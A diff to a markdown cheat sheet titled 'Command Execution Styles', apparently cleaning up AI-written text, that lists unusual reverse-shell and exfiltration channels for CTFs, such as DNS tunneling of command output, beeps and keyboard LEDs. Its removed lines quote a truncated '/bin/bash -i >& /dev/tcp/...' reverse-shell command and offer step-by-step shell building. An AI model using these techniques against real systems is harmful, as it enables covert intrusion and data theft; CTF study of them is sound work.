@@ -1,9 +1,5 @@
 # Command Execution Styles
 
-Ah, got it — you're asking about weirder, more abstract reverse shell techniques beyond the usual /bin/bash -i >& /dev/tcp/... stuff.
-
-Absolutely. CTFs get delightfully strange. Here's a sampler:
-
 1. DNS Tunneling Shell
 
 · No direct outbound TCP? Exfil command output via DNS queries
@@ -57,5 +53,3 @@ Absolutely. CTFs get delightfully strange. Here's a sampler:
 
 · Beep on beep command for binary output
 · Keyboard LEDs via setleds
-
-Want me to deep dive into one of these — like building a file-based dead drop shell step by step?
